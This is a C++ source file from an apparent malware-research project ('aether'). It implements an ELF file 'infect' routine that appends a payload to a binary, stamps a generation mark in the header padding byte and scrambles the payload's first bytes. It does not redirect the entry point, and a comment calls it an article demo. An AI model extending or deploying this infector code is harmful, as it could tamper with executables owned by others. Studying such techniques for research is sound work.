/**
 * SPDX-License-Identifier: LicenseRef-Aether-Research
 * Copyright (c) 2024–2026 Macstab GmbH.
 *
 * Licensed under the Aether Research License in the repository root file
 * LICENSE. Authorized lab / lawful private use only as defined there.
 * By using this file you accept LICENSE. See docs/LICENSE_ACCEPTANCE.md.
 */

#include "aether/infect/infect.hpp"

#include "aether/common/platform_elf.hpp"
#include "aether/common/rng.hpp"
#include "aether/mutate/mutate.hpp"

#include <algorithm>
#include <cstdio>
#include <cstring>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

namespace aether {

/**
 * Appends @p payload to the ELF at @p path, bumps EI_PAD, and scrambles the
 * first ≤64 payload bytes. Does not rewrite e_entry or program headers.
 * @return 0 on success, non-zero on failure
 */
int infect(const char* path, const std::vector<uint8_t>& payload) {
    int fd = open(path, O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    struct stat st;
    fstat(fd, &st);
    size_t old = st.st_size;
    size_t add = payload.size() + 48;

    if (ftruncate(fd, old + add) < 0) {
        close(fd);
        return 1;
    }

    void* m = mmap(nullptr, old + add, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (m == MAP_FAILED) {
        close(fd);
        return 1;
    }

    Elf64_Ehdr* eh = (Elf64_Ehdr*)m;
    if (memcmp(eh->e_ident, ELFMAG, 4) != 0) {
        munmap(m, old + add);
        close(fd);
        return 1;
    }

    // Changing pad byte = generation mark for the article demo.
    eh->e_ident[EI_PAD] = (eh->e_ident[EI_PAD] + rnd(1, 40) + 1) | 0x80;
    memcpy((char*)m + old, payload.data(), payload.size());
    continuous_mutate((uint8_t*)m + old, std::min(payload.size(), (size_t)64));

    msync(m, old + add, MS_SYNC);
    munmap(m, old + add);
    close(fd);

    printf("[+] Infected %s (%zu → %zu bytes, mark changed)\n", path, old, old + add);
    return 0;
}

} // namespace aether
